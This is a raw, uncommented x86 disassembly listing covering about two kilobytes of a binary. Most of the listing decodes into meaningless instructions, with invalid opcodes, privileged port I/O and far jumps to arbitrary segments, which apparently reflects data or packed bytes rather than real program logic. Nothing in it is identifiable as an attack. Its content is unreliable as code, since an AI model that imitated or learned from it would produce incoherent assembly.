  4178b9:	ja     0x4178bc
  4178bb:	jmp    0x4ae7:0x5f2856eb
  4178c2:	sub    al,0x32
  4178c4:	mov    ecx,0xac699b77
  4178c9:	jg     0x4178b9
  4178cb:	pop    esi
  4178cc:	sub    ebp,DWORD PTR [edx-0x19]
  4178cf:	out    0x5b,al
  4178d1:	xor    ecx,edx
  4178d3:	add    esi,ebx
  4178d5:	mov    ebp,0x4857141b
  4178da:	std    
  4178db:	cmc    
  4178dc:	cli    
  4178dd:	xchg   esi,eax
  4178de:	jmp    0x4178f6
  4178e0:	mov    bh,ah
  4178e2:	sub    ebp,eax
  4178e4:	mov    eax,0xd7626934
  4178e9:	sbb    BYTE PTR [ebx-0x4d],dh
  4178ec:	push   cs
  4178ed:	das    
  4178ee:	fdiv   DWORD PTR [ebx]
  4178f0:	jmp    0x417949
  4178f2:	lea    ebx,[eax]
  4178f4:	sbb    al,0x28
  4178f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178f7:	jne    0x41787f
  4178f9:	clc    
  4178fa:	cmp    dh,BYTE PTR [esi-0x36]
  4178fd:	and    DWORD PTR es:[esi-0x26cfd269],ecx
  417904:	aaa    
  417905:	jmp    0x417924
  417907:	sub    eax,0xb35dabd6
  41790c:	jecxz  0x417955
  41790e:	xor    eax,0x335143a8
  417913:	loope  0x4178c0
  417915:	lea    ecx,[esp+ebp*4+0x7b]
  417919:	push   esp
  41791a:	or     al,bl
  41791c:	add    DWORD PTR [ecx+edx*2-0x14],ebx
  417920:	int3   
  417921:	daa    
  417922:	out    0x79,eax
  417924:	add    esp,esp
  417926:	adc    eax,0x4aa0ad
  41792b:	push   cs
  41792c:	jb     0x4178de
  41792e:	fsub   QWORD PTR [esi]
  417930:	loop   0x41793a
  417932:	sbb    eax,0x45d637d9
  417937:	(bad)  
  417938:	(bad)
  41793b:	retf   0xebda
  41793e:	test   eax,0xc4d68418
  417943:	cmp    BYTE PTR [esi],al
  417945:	push   ss
  417946:	(bad)  
  417947:	iret   
  417948:	pop    esi
  417949:	rcr    BYTE PTR [ebx+0x0],cl
  41794c:	call   0x68be38c0
  417951:	inc    esi
  417952:	cmp    eax,0xa546612f
  417957:	int    0x6d
  417959:	cli    
  41795a:	lea    esi,[ecx+0x6]
  41795d:	sbb    al,0xcf
  41795f:	add    DWORD PTR [ebx],ecx
  417961:	cld    
  417962:	xchg   ebx,eax
  417963:	out    0x8b,eax
  417965:	push   ss
  417966:	sar    eax,cl
  417968:	int    0x5f
  41796a:	pop    ds
  41796b:	add    esp,ebx
  41796d:	out    0xab,al
  41796f:	jb     0x4179bb
  417971:	adc    BYTE PTR [edi+0x4376c202],dh
  417977:	mov    edi,cs
  417979:	xchg   ecx,eax
  41797a:	fcom   QWORD PTR [ebx]
  41797c:	std    
  41797d:	inc    esi
  41797e:	sub    eax,0xcd99d0a5
  417983:	bound  eax,QWORD PTR [ebx+0x72187c5b]
  417989:	and    dl,cl
  41798b:	ficom  DWORD PTR [ebx+0x6374ba5e]
  417991:	jbe    0x41791b
  417993:	mov    esi,0x396bab01
  417998:	clc    
  417999:	dec    esp
  41799a:	stos   BYTE PTR es:[edi],al
  41799b:	push   ecx
  41799c:	fstp   TBYTE PTR [ebp-0x25d982ea]
  4179a2:	xchg   edi,eax
  4179a3:	push   edi
  4179a4:	in     al,dx
  4179a5:	fucomp st(2)
  4179a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179a8:	pop    es
  4179a9:	mov    ds:0x19c069be,al
  4179ae:	fsubr  QWORD PTR [ecx+eax*8-0x14e6909e]
  4179b5:	pop    ss
  4179b6:	inc    esp
  4179b7:	mov    ds:0xf30deb08,eax
  4179bc:	mov    eax,ds:0x79cff2af
  4179c1:	fmul   DWORD PTR [esi]
  4179c3:	and    al,BYTE PTR [ebx]
  4179c5:	stos   DWORD PTR es:[edi],eax
  4179c6:	sbb    BYTE PTR [ecx-0x736d759d],ch
  4179cc:	cmp    eax,DWORD PTR [ebp-0x55743fbd]
  4179d2:	push   ebp
  4179d3:	pop    esi
  4179d4:	cmp    eax,0x19f7e454
  4179d9:	mov    WORD PTR [edi],es
  4179db:	mov    ch,BYTE PTR [esi]
  4179dd:	mov    bh,0x31
  4179df:	shl    DWORD PTR [eax-0x68],cl
  4179e2:	or     ah,BYTE PTR [edx]
  4179e4:	loope  0x417a34
  4179e6:	xor    BYTE PTR [eax],0xea
  4179e9:	jl     0x417a41
  4179eb:	ret    0x9dc8
  4179ee:	rol    DWORD PTR [esi-0x3a],0x10
  4179f2:	jmp    0x559fe3fe
  4179f7:	jae    0x417a03
  4179f9:	sbb    cl,BYTE PTR ds:0x85de5cb8
  4179ff:	rcr    DWORD PTR [edx],0x7a
  417a02:	mov    edx,0xb3aad0bb
  417a07:	or     edx,DWORD PTR [esi+0x65d969bf]
  417a0d:	lods   eax,DWORD PTR ds:[esi]
  417a0e:	ret    0x495c
  417a11:	add    DWORD PTR [esi-0x604b81ce],edx
  417a17:	outs   dx,BYTE PTR ds:[esi]
  417a18:	and    al,0xff
  417a1a:	dec    edi
  417a1b:	push   edi
  417a1c:	mov    WORD PTR ds:0x9df3ca59,gs
  417a22:	loop   0x417a86
  417a24:	mov    al,ds:0x4799878c
  417a29:	int3   
  417a2a:	bound  esp,QWORD PTR [ebp-0x1c51945a]
  417a30:	inc    edx
  417a31:	retf   
  417a32:	xlat   BYTE PTR ds:[ebx]
  417a33:	leave  
  417a34:	mov    al,cl
  417a36:	iret   
  417a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a38:	outs   dx,DWORD PTR ds:[esi]
  417a39:	(bad)  
  417a3a:	dec    edi
  417a3b:	into   
  417a3c:	fidiv  WORD PTR [ebp+0x704d983b]
  417a42:	add    edi,ebp
  417a44:	ds cwde 
  417a46:	mov    cl,0x2a
  417a48:	call   0x7b382bed
  417a4d:	in     eax,dx
  417a4e:	sbb    al,ch
  417a50:	push   cs
  417a51:	mov    eax,0x9021c14b
  417a56:	js     0x417a55
  417a58:	cwde   
  417a59:	mov    dh,0x91
  417a5b:	lds    edi,FWORD PTR [edx]
  417a5d:	jmp    0x9728:0x48313956
  417a64:	mov    esp,0x1afcbcae
  417a69:	neg    DWORD PTR ds:0xfea52164
  417a6f:	lock aad 0x7
  417a72:	add    ah,BYTE PTR [ebx]
  417a74:	sbb    eax,DWORD PTR [eax-0x35]
  417a77:	cmp    edx,DWORD PTR es:[esi+ecx*1-0x527360d5]
  417a7f:	cli    
  417a80:	cmp    edx,DWORD PTR [edx+eiz*1+0x7bbb8a6b]
  417a87:	jle    0x417a9c
  417a89:	mov    bh,0x52
  417a8b:	pusha  
  417a8c:	ret    0x3098
  417a8f:	mov    DWORD PTR [edx-0x9],ebx
  417a92:	xor    esp,DWORD PTR [edi+0x70805275]
  417a98:	or     BYTE PTR [ecx],cl
  417a9a:	push   esp
  417a9b:	clc    
  417a9c:	cld    
  417a9d:	fnstsw WORD PTR [edi-0x33fd2612]
  417aa3:	mov    al,0x4b
  417aa5:	stos   BYTE PTR es:[edi],al
  417aa6:	jno    0x417a3d
  417aa8:	out    dx,eax
  417aa9:	ds jmp 0x417a9e
  417aac:	test   eax,0xf3415c91
  417ab1:	repnz pop ds
  417ab3:	jecxz  0x417b15
  417ab5:	inc    eax
  417ab6:	scas   al,BYTE PTR es:[edi]
  417ab7:	sbb    DWORD PTR [edx],edx
  417ab9:	cmp    bl,BYTE PTR [eax+0x23]
  417abc:	fldcw  WORD PTR [esi+0x2c49083]
  417ac2:	pop    DWORD PTR [esi]
  417ac4:	xchg   edi,eax
  417ac5:	lock call 0xa800:0x4a5d0778
  417acd:	dec    ebp
  417ace:	sbb    DWORD PTR [ebx-0x5a],esp
  417ad1:	stc    
  417ad2:	push   ds
  417ad3:	pop    es
  417ad4:	aad    0x47
  417ad6:	push   ecx
  417ad7:	push   edi
  417ad8:	cmp    DWORD PTR [ebx],esi
  417ada:	xchg   esp,eax
  417adb:	or     edx,DWORD PTR [ecx+0x3]
  417ade:	xchg   BYTE PTR [edi+0x1af60659],bl
  417ae4:	stos   BYTE PTR es:[edi],al
  417ae5:	scas   eax,DWORD PTR es:[edi]
  417ae6:	sbb    bl,BYTE PTR [ebx]
  417ae8:	add    DWORD PTR [edx-0x2df66e09],ebx
  417aee:	sub    DWORD PTR [ebx+ecx*1+0x6e],ebx
  417af2:	not    BYTE PTR [ebx+0x2c145b04]
  417af8:	xchg   ebx,eax
  417af9:	sbb    DWORD PTR es:[ecx+0x64],ebx
  417afd:	pop    edi
  417afe:	xchg   edx,eax
  417aff:	sbb    DWORD PTR [ebx+0x4c3086b8],edx
  417b05:	ret    0x5d7
  417b08:	cmp    DWORD PTR [esi-0x7ec1da8],edx
  417b0e:	daa    
  417b0f:	xlat   BYTE PTR ds:[ebx]
  417b10:	xor    DWORD PTR [eax-0x41],edx
  417b13:	pop    esp
  417b14:	xchg   ebp,eax
  417b15:	ss jbe 0x417b95
  417b18:	push   ebp
  417b19:	int    0xca
  417b1b:	mov    ds:0xbea363,eax
  417b20:	jbe    0x417b6e
  417b22:	hlt    
  417b23:	dec    edi
  417b24:	xchg   ebx,eax
  417b25:	sar    DWORD PTR [edx],0xea
  417b28:	arpl   bp,dx
  417b2a:	iret   
  417b2b:	ret    
  417b2c:	xchg   ecx,eax
  417b2d:	loope  0x417b6f
  417b2f:	popf   
  417b30:	push   eax
  417b31:	int    0x4a
  417b33:	push   cs
  417b34:	xchg   BYTE PTR [ebx+0x43374a1],al
  417b3a:	dec    ebp
  417b3b:	xchg   ebx,eax
  417b3c:	sub    BYTE PTR [eax+eiz*4],0xfa
  417b40:	xchg   ecx,eax
  417b41:	leave  
  417b42:	xchg   DWORD PTR [ebp+0x41],eax
  417b45:	sar    BYTE PTR [edi],1
  417b47:	push   cs
  417b48:	frstor [ecx+0x3f]
  417b4b:	xor    eax,0x3ddaad7a
  417b50:	stos   DWORD PTR es:[edi],eax
  417b51:	and    al,0xe2
  417b53:	dec    esi
  417b54:	call   DWORD PTR [eax]
  417b56:	fdivr  DWORD PTR [edi+0x73ecc7fe]
  417b5c:	mov    DWORD PTR [edi],0x20c97db2
  417b62:	outs   dx,DWORD PTR ds:[esi]
  417b63:	xlat   BYTE PTR ds:[ebx]
  417b64:	out    0xa8,eax
  417b66:	add    DWORD PTR [ecx-0x6c8b8575],edx
  417b6c:	xchg   ecx,eax
  417b6d:	arpl   WORD PTR [edi-0x790d2853],si
  417b73:	sbb    DWORD PTR [edi],ebp
  417b75:	fiadd  DWORD PTR [ecx-0x79]
  417b78:	adc    esp,DWORD PTR [ecx]
  417b7a:	push   ss
  417b7b:	mov    bl,0x27
  417b7d:	jbe    0x417bd4
  417b7f:	lea    eax,[eax+ecx*4-0x1202cb9c]
  417b86:	adc    eax,0x9b4b8c80
  417b8b:	xchg   ebx,eax
  417b8c:	ins    BYTE PTR es:[edi],dx
  417b8d:	xor    dh,cl
  417b8f:	mov    edi,0xe9d4dfbc
  417b94:	inc    esi
  417b95:	jo     0x417b7e
  417b97:	sbb    edi,DWORD PTR [esi]
  417b99:	cmp    eax,esp
  417b9b:	dec    ecx
  417b9c:	cmc    
  417b9d:	adc    eax,0x5d76c33a
  417ba2:	shl    BYTE PTR [edi],1
  417ba4:	inc    ebp
  417ba5:	mov    bl,0x78
  417ba7:	jmp    0x417b6e
  417ba9:	lea    ebp,[esp+eax*1]
  417bac:	pop    es
  417bad:	and    BYTE PTR [ecx],ch
  417baf:	pusha  
  417bb0:	dec    edx
  417bb1:	test   al,0x96
  417bb3:	std    
  417bb4:	add    al,0x65
  417bb6:	push   cs
  417bb7:	jno    0x417c00
  417bb9:	push   ebx
  417bba:	sahf   
  417bbb:	add    DWORD PTR [ecx-0x29],ebx
  417bbe:	test   eax,0xdd63f41c
  417bc3:	push   es
  417bc4:	mov    edi,eax
  417bc6:	mov    edi,?
  417bc8:	jno    0x417b9f
  417bca:	push   edx
  417bcb:	hlt    
  417bcc:	push   0x558e5141
  417bd1:	mov    dh,0xb7
  417bd3:	jmp    0xfd44:0x2f9c3751
  417bda:	std    
  417bdb:	aaa    
  417bdc:	dec    esi
  417bdd:	aaa    
  417bde:	adc    al,0x79
  417be0:	add    al,0x3d
  417be2:	int    0x7d
  417be4:	shr    DWORD PTR [ebx],0xb6
  417be7:	pop    edx
  417be8:	lods   al,BYTE PTR ds:[esi]
  417be9:	or     ebx,esi
  417beb:	ss out 0xaa,eax
  417bee:	pusha  
  417bef:	and    edx,DWORD PTR [esi]
  417bf1:	retf   
  417bf2:	jae    0x417c1a
  417bf4:	or     DWORD PTR ds:[ecx+0x5a24ed80],0x78
  417bfc:	and    ch,0x18
  417bff:	pop    ss
  417c00:	sbb    al,0x8e
  417c02:	fwait
  417c03:	pop    edi
  417c04:	mov    DWORD PTR [ebx-0x2a],esi
  417c07:	in     al,dx
  417c08:	repz gs add al,0x73
  417c0c:	rol    BYTE PTR [ecx],1
  417c0e:	call   0xfd4de00b
  417c13:	(bad)
  417c18:	sbb    DWORD PTR [ecx-0x2976b37d],esp
  417c1e:	enter  0x6c94,0x92
  417c22:	jne    0x417c9a
  417c24:	dec    ecx
  417c25:	shl    BYTE PTR [esp+ebp*8+0x5e8c4291],1
  417c2c:	loop   0x417bbb
  417c2e:	xor    DWORD PTR [ecx],ebx
  417c30:	mov    cl,0x7f
  417c32:	retf   0x14e7
  417c35:	mov    eax,ds:0xf4f56b1f
  417c3a:	stos   BYTE PTR es:[edi],al
  417c3b:	(bad)  
  417c3c:	cmp    ecx,DWORD PTR [ebp-0x74c12c7]
  417c42:	cld    
  417c43:	inc    eax
  417c44:	pop    edi
  417c45:	dec    edx
  417c46:	xchg   DWORD PTR [esi+0x22],esi
  417c49:	imul   esi,DWORD PTR [ebp-0x250efb6],0x8627ca0b
  417c53:	rol    BYTE PTR [edi+0x1568c33c],cl
  417c59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c5a:	sub    ecx,ebx
  417c5c:	(bad)  [edx]
  417c5e:	xchg   esi,eax
  417c5f:	out    dx,al
  417c60:	cld    
  417c61:	(bad)  [ebx]
  417c63:	fnsetpm(287 only) 
  417c65:	ret    0x549f
  417c68:	sbb    BYTE PTR [ebx+0x57],cl
  417c6b:	jmp    0x43337558
  417c70:	sub    eax,0x7ac677a9
  417c75:	fidiv  WORD PTR [esi-0x69]
  417c78:	pop    esp
  417c79:	ja     0x417c9a
  417c7b:	sub    eax,DWORD PTR [ebx]
  417c7d:	jp     0x417cf0
  417c7f:	lods   al,BYTE PTR ds:[esi]
  417c80:	dec    ebp
  417c81:	pop    ebx
  417c82:	test   eax,0x3ee54900
  417c87:	mov    dh,BYTE PTR [esi+ebx*1+0xf]
  417c8b:	sub    al,BYTE PTR [eax+0x40865c99]
  417c91:	out    0x92,eax
  417c93:	aas    
  417c94:	(bad)  
  417c95:	jo     0x417c61
  417c97:	rcl    dl,1
  417c99:	out    dx,al
  417c9a:	lock outs dx,DWORD PTR ds:[esi]
  417c9c:	mov    al,0x6c
  417c9e:	icebp  
  417c9f:	adc    DWORD PTR [ebx],ebp
  417ca1:	adc    DWORD PTR [ecx],ecx
  417ca3:	shl    BYTE PTR [esi+0x7a],0xc0
  417ca7:	and    DWORD PTR [esi+0x52],esp
  417caa:	mov    dh,0x24
  417cac:	jmp    0x4b395dee
  417cb1:	mov    DWORD PTR [ebx-0x7a],0x77fc55fa
  417cb8:	xchg   cl,dh
  417cba:	scas   eax,DWORD PTR es:[edi]
  417cbb:	(bad)  
  417cbc:	je     0x417d22
  417cbe:	out    dx,al
  417cbf:	pop    ecx
  417cc0:	inc    esi
  417cc1:	inc    eax
  417cc2:	add    al,0x9a
  417cc4:	cmp    eax,0x82c1b35d
  417cc9:	es stos BYTE PTR es:[edi],al
  417ccb:	dec    edx
  417ccc:	push   esp
  417ccd:	adc    al,0x4a
  417ccf:	jmp    0xb846:0x34e26f14
  417cd6:	test   BYTE PTR [eax],ah
  417cd8:	dec    edi
  417cd9:	popa   
  417cda:	or     ecx,DWORD PTR [edi]
  417cdc:	shl    ebx,cl
  417cde:	inc    edi
  417cdf:	xchg   esp,eax
  417ce0:	cmp    eax,0xde84cd0a
  417ce5:	cmp    ecx,0xffffffef
  417ce8:	test   BYTE PTR [ebx+eiz*2-0x2a],dl
  417cec:	mov    WORD PTR [edi+0x7a],?
  417cef:	sub    DWORD PTR [ecx-0x316d5acd],ebp
  417cf5:	fcomip st,st(1)
  417cf7:	push   edi
  417cf8:	mov    esp,0xa0f7de25
  417cfd:	inc    esi
  417cfe:	iret   
  417cff:	xchg   eax,ebx
  417d01:	pop    ecx
  417d02:	jb     0x417d72
  417d04:	nop
  417d05:	bound  edx,QWORD PTR [eax+ebp*4+0x5edb3379]
  417d0c:	mov    ecx,0x76c7ad3c
  417d11:	push   ebx
  417d12:	imul   ebx,DWORD PTR [eax+0x1e],0xa398c915
  417d19:	shl    BYTE PTR [ebp+ecx*2+0xa1c585b],cl
  417d20:	pushf  
  417d21:	mov    DWORD PTR [esi],edx
  417d23:	mov    ebx,0x8ad5c05e
  417d28:	add    eax,0xed34b67e
  417d2d:	dec    edx
  417d2e:	pusha  
  417d2f:	cmp    DWORD PTR ds:0x8aab2d9e,esi
  417d35:	add    BYTE PTR [esi-0x2ab0fa66],dl
  417d3b:	pop    edi
  417d3c:	add    eax,0xeff5ba11
  417d41:	jmp    0x417d7c
  417d43:	std    
  417d44:	call   FWORD PTR [ecx]
  417d46:	sbb    eax,0xc41af260
  417d4b:	xchg   esi,eax
  417d4c:	inc    esi
  417d4d:	cmp    DWORD PTR [ebx+esi*4],edi
  417d50:	data16 sub BYTE PTR [edx+eiz*2-0x61bffa79],dl
  417d58:	rcr    ecx,1
  417d5a:	pop    ebp
  417d5b:	mov    ecx,0x3efe6884
  417d60:	pop    di
  417d62:	push   cs
  417d63:	pop    eax
  417d64:	adc    edx,DWORD PTR [eax+0x8ed92f5]
  417d6a:	mov    ebp,0xe848c4bc
  417d6f:	cmp    bh,BYTE PTR [edx]
  417d71:	xor    bh,BYTE PTR [ecx+ebp*1]
  417d74:	jecxz  0x417dde
  417d76:	cwde   
  417d77:	jg     0x417da2
  417d79:	cwde   
  417d7a:	sub    al,cl
  417d7c:	push   ss
  417d7d:	jmp    0xfb8a4f14
  417d82:	pop    edi
  417d83:	jb     0x417d73
  417d85:	ffreep st(4)
  417d87:	add    DWORD PTR [ebp+0x1f5e2ede],eax
  417d8d:	dec    eax
  417d8e:	popf   
  417d8f:	add    eax,0x476b6332
  417d94:	cmp    cl,BYTE PTR [edi-0x1536ad60]
  417d9a:	pop    ebx
  417d9b:	inc    eax
  417d9c:	rol    ebp,1
  417d9e:	fsubr  st,st(5)
  417da0:	mov    edx,0x88c8c060
  417da5:	dec    ebx
  417da6:	les    ebp,FWORD PTR [esi]
  417da8:	mov    edi,0x1d7c9127
  417dad:	xchg   edx,eax
  417dae:	push   edi
  417daf:	xchg   ebp,eax
  417db0:	std    
  417db1:	loope  0x417e1e
  417db3:	mov    al,ds:0x2b1ded60
  417db8:	cmc    
  417db9:	xor    esp,DWORD PTR [eax+edi*1+0xfd56508]
  417dc0:	dec    ecx
  417dc1:	int3   
  417dc2:	adc    BYTE PTR [ecx+0x64868770],dl
  417dc8:	sub    edi,DWORD PTR [eax-0x66]
  417dcb:	pop    esp
  417dcc:	into   
  417dcd:	lahf   
  417dce:	ins    DWORD PTR es:[edi],dx
  417dcf:	mov    ds:0x37f261d9,eax
  417dd4:	je     0x417dad
  417dd6:	adc    bl,BYTE PTR [eax+0x799ff3e9]
  417ddc:	dec    eax
  417ddd:	not    BYTE PTR [ebx-0x64]
  417de0:	fidiv  DWORD PTR [eax]
  417de2:	std    
  417de3:	ss dec ebx
  417de5:	xchg   edi,eax
  417de6:	push   ds
  417de7:	mov    bl,0xd7
  417de9:	xor    al,0x17
  417deb:	js     0x417dbb
  417ded:	cmp    edi,DWORD PTR [edi+0x10c87b38]
  417df3:	pop    esi
  417df4:	adc    DWORD PTR [eax],esi
  417df6:	stos   BYTE PTR es:[edi],al
  417df7:	ds xchg esi,eax
  417df9:	into   
  417dfa:	xchg   esi,edi
  417dfc:	nop
  417dfd:	(bad)  
  417dfe:	retf   0x9942
  417e01:	(bad)  
  417e02:	adc    bl,BYTE PTR ds:0xc90920b2
  417e08:	adc    DWORD PTR ds:0xa8b239a0,edx
  417e0e:	jle    0x417e82
  417e10:	dec    ebp
  417e11:	sbb    eax,DWORD PTR [eax+ebx*1-0x62]
  417e15:	call   FWORD PTR ds:[ecx-0x696a8aae]
  417e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e1d:	mov    al,ds:0x78a457e9
  417e22:	xchg   esi,eax
  417e23:	aaa    
  417e24:	cmp    cl,BYTE PTR [ebx-0x19c42080]
  417e2a:	cmp    DWORD PTR [ebx-0x73751fb3],ecx
  417e30:	or     eax,0xffffff5c
  417e35:	mov    edx,DWORD PTR [ebp+0xc]
  417e38:	cmp    cl,BYTE PTR [edx]
  417e3a:	jne    0x420de3
  417e40:	mov    ecx,DWORD PTR [ebp-0x14]
  417e43:	mov    edx,DWORD PTR [ebp+0xc]
  417e46:	movsx  edx,BYTE PTR [edx]
  417e49:	xor    ecx,eax
  417e4b:	add    ecx,esi
  417e4d:	jmp    0x41a1da
  417e52:	cmp    DWORD PTR [ecx],ecx
  417e54:	mov    ebp,0x79c6ad42
  417e59:	stc    
  417e5a:	mov    DWORD PTR [ebp-0x58],edi
  417e5d:	fchs   
  417e5f:	mov    esp,0x38de1574
  417e64:	jge    0x417ee0
  417e66:	or     bl,BYTE PTR [edi+0x7a]
  417e69:	jp     0x417e39
  417e6b:	xor    edx,DWORD PTR [eax-0x278cc035]
  417e71:	dec    eax
  417e72:	push   ds
  417e73:	mov    eax,0x5f18f6a8
  417e78:	push   cs
  417e79:	and    al,0x1e
  417e7b:	push   esp
  417e7c:	nop
  417e7d:	cld    
  417e7e:	(bad)  
  417e7f:	sub    DWORD PTR [ebp-0x23bd07f7],ebx
  417e85:	hlt    
  417e86:	and    eax,0x5712bba3
  417e8b:	into   
  417e8c:	repnz xchg esp,eax
  417e8e:	jno    0x417e19
  417e90:	mov    dh,0x8f
  417e92:	sub    bl,BYTE PTR [esi+0x6262f0a5]
  417e98:	les    edx,FWORD PTR [esi]
  417e9a:	ds cli 
  417e9c:	mov    ebx,0x793df679
  417ea1:	gs mov edi,0xaced7594
  417ea7:	rcr    BYTE PTR [edx],cl
  417ea9:	out    0x69,al
  417eab:	dec    eax
  417eac:	mov    WORD PTR [ecx+0x3ebac1ec],ss
  417eb2:	adc    al,0x40
  417eb4:	xlat   BYTE PTR ds:[ebx]
  417eb5:	mov    ebx,0x740deed4
  417eba:	sbb    dl,BYTE PTR [edi+0x62]
  417ebd:	pushf  
  417ebe:	push   edi
  417ebf:	aad    0x67
  417ec1:	xor    edi,esp
  417ec3:	mov    eax,0x61d8b277
  417ec8:	lds    ecx,FWORD PTR [ecx-0x2e]
  417ecb:	(bad)  
  417ecc:	cli    
  417ecd:	das    
  417ece:	gs sti 
  417ed0:	cmp    BYTE PTR [ecx-0x3bf49500],ch
  417ed6:	mov    dl,0xa4
  417ed8:	mov    bh,0x3a
  417eda:	jg     0x417e60
  417edc:	pop    edi
  417edd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ede:	push   es
  417edf:	adc    DWORD PTR [edi-0x3c],edi
  417ee2:	cwde   
  417ee3:	clc    
  417ee4:	fadd   DWORD PTR [ebx-0x2f]
  417ee7:	das    
  417ee8:	loop   0x417ee0
  417eea:	ds cs daa 
  417eed:	mov    ds:0x6d2f82ae,eax
  417ef2:	inc    ebx
  417ef3:	mov    edi,0xc965d78d
  417ef8:	mov    esp,0xa8ce4011
  417efd:	repnz mov ds:0xe3de3787,al
  417f03:	rcl    DWORD PTR [ebx+eax*2+0x36],1
  417f07:	cld    
  417f08:	push   ecx
  417f09:	or     ah,BYTE PTR [ebx]
  417f0b:	pushf  
  417f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f0d:	mov    ecx,0xbf578aa4
  417f12:	mov    edi,DWORD PTR [edx-0x2bf3ffab]
  417f18:	jp     0x417f09
  417f1a:	leave  
  417f1b:	scas   al,BYTE PTR es:[edi]
  417f1c:	add    DWORD PTR [esi+0x6a],edx
  417f1f:	sbb    BYTE PTR [esi],0x49
  417f22:	pop    ds
  417f23:	sbb    BYTE PTR [edx+0x2fff76c],ah
  417f29:	pop    eax
  417f2a:	mov    eax,0x8bec30c
  417f2f:	(bad)  
  417f31:	mov    ds:0xae0d55ce,eax
  417f36:	retf   
  417f37:	in     al,0x83
  417f39:	xchg   esp,eax
  417f3a:	dec    ebp
  417f3b:	pop    es
  417f3c:	push   es
  417f3d:	(bad)  
  417f3e:	cwde   
  417f3f:	pop    edi
  417f40:	sbb    edx,edx
  417f42:	(bad)  
  417f43:	jecxz  0x417f76
  417f45:	lods   al,BYTE PTR ds:[esi]
  417f46:	(bad)  
  417f47:	mov    edi,0xc24e3f
  417f4c:	mov    ch,0xd9
  417f4e:	stos   BYTE PTR es:[edi],al
  417f4f:	nop
  417f50:	lea    edx,[edi+ecx*2]
  417f53:	out    0x16,al
  417f55:	xlat   BYTE PTR ds:[ebx]
  417f56:	ret    
  417f57:	mov    ecx,0x1cbf4282
  417f5c:	mov    ebx,0x1aacf839
  417f61:	loop   0x417fa0
  417f63:	(bad)  
  417f65:	enter  0xaf04,0xed
  417f69:	sbb    al,0xc2
  417f6b:	imul   ebx,ebp,0x46
  417f6e:	lods   eax,DWORD PTR ds:[esi]
  417f6f:	psubsb mm1,mm3
  417f72:	(bad)  
  417f73:	pushf  
  417f74:	int    0xcc
  417f76:	add    BYTE PTR cs:0x3929549e,bh
  417f7d:	out    0x53,eax
  417f7f:	mov    ds,WORD PTR [edx+0x1b]
  417f82:	pop    esp
  417f83:	sbb    dl,cl
  417f85:	pop    esi
  417f86:	scas   eax,DWORD PTR es:[edi]
  417f87:	xor    al,0x37
  417f89:	jmp    0x418008
  417f8b:	jmp    0xc11e:0xba90cae3
  417f92:	jge    0x417f4e
  417f94:	std    
  417f95:	imul   DWORD PTR [ebp+0x74351040]
  417f9b:	loope  0x417f57
  417f9d:	test   edi,edi
  417f9f:	adc    BYTE PTR [ebp+0x7c7b9fb5],dl
  417fa5:	pop    ebx
  417fa6:	rcl    cl,cl
  417fa8:	push   edi
  417fa9:	outs   dx,BYTE PTR ds:[esi]
  417faa:	lock xchg BYTE PTR [edi+0x49],dl
  417fae:	call   0xe331bd56
  417fb3:	neg    DWORD PTR [ebp+0x7d]
  417fb6:	mov    bh,BYTE PTR [edx+0x40]
  417fb9:	and    esi,DWORD PTR [ebp-0x1813c036]
  417fbf:	xchg   BYTE PTR [ebp-0x676a7cb3],al
  417fc5:	mov    ecx,0x8a76d526
  417fca:	push   ds
  417fcb:	and    edx,DWORD PTR [ecx+0x69]
  417fce:	(bad)  
  417fcf:	push   ss
  417fd0:	jl     0x418041
  417fd2:	fiadd  WORD PTR [edx+0x802113d]
  417fd8:	or     DWORD PTR [esi],0x31
  417fdb:	les    ecx,FWORD PTR [ebx]
  417fdd:	mov    DWORD PTR [edx+ebx*1+0x2a29e073],0x8320d634
  417fe8:	sub    dh,0x80
  417feb:	fsubr  DWORD PTR [ebp-0x5f]
  417fee:	das    
  417fef:	outs   dx,DWORD PTR ds:[esi]
  417ff0:	add    bl,0x23
  417ff3:	jg     0x417fde
  417ff5:	inc    esp
  417ff6:	mov    esp,ecx
  417ff8:	and    BYTE PTR [ebx],bl
  417ffa:	mov    WORD PTR [ecx],ds
  417ffc:	shr    ebp,0x81
  417fff:	sar    BYTE PTR [ebp+esi*2-0x56],1
  418003:	loope  0x418025
  418005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418006:	xchg   edi,eax
  418007:	dec    ebx
  418008:	call   0xc9b:0x70c30260
  41800f:	lods   eax,DWORD PTR ds:[esi]
  418010:	cmp    ebp,esp
  418012:	adc    ah,BYTE PTR [ebx+0x65]
  418015:	inc    ebx
  418016:	bound  ebp,QWORD PTR [ebp-0x75]
  418019:	inc    ebp
  41801a:	jle    0x417fb0
  41801c:	popf   
  41801d:	popa   
  41801e:	shl    BYTE PTR [ebp-0x215f285d],0x97
  418025:	not    BYTE PTR [ebx+0x67bf7174]
  41802b:	cmp    al,0x24
  41802d:	ss jle 0x41803f
  418030:	enter  0xdde0,0xc7
  418034:	arpl   sp,cx
  418036:	addr16 jg 0x417fe8
  418039:	and    eax,DWORD PTR [ebx+edx*4-0x2]
  41803d:	cmp    ch,ch
  41803f:	popf   
  418040:	xchg   edx,eax
  418041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418042:	mov    WORD PTR [edi+0x52],fs
  418045:	imul   DWORD PTR [ecx-0x70]
  418048:	gs ins DWORD PTR es:[edi],dx
  41804a:	mov    WORD PTR [edx],?
  41804c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41804d:	rcl    DWORD PTR [ebx+eiz*4+0x22083734],1
  418054:	cmp    al,0x93
  418056:	cwde   
  418057:	ja     0x41804d
  418059:	add    DWORD PTR [esi+0x37e3c8fe],esp
  41805f:	push   cs
  418060:	int3   
  418061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418062:	lahf   
  418063:	inc    edx
  418064:	push   edi
  418066:	test   eax,0x65970689
  41806b:	ds or  edx,0xa5751403
  418072:	jae    0x4180ae
  418074:	cmp    BYTE PTR [edx],0x1e
  418077:	ds ss in al,0x10
  41807b:	cdq    
  41807c:	ds sub al,0x3e
  41807f:	pop    eax
